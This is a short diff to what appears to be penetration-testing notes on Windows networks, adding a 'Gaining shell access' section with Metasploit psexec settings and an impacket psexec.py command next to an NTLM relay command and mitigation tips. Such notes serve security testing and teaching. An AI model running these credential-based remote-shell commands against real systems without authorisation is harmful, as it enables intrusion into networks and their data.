@@ -51,3 +51,20 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support -i
 * Disable ntlm auth on network
 * Account tiering
 * Local administration&#x20;
+
+## Gaining shell access
+
+```
+use exploit/windows/smb/psexec
+set RHOSTS <rhost>
+set SMBDomain <domain>
+set SMBUser <user>
+set SMBPass <pass>
+```
+
+Use psexec.py
+
+```
+psexec.py <domain>/<user>:'<pass>'@<ip>
+
+```
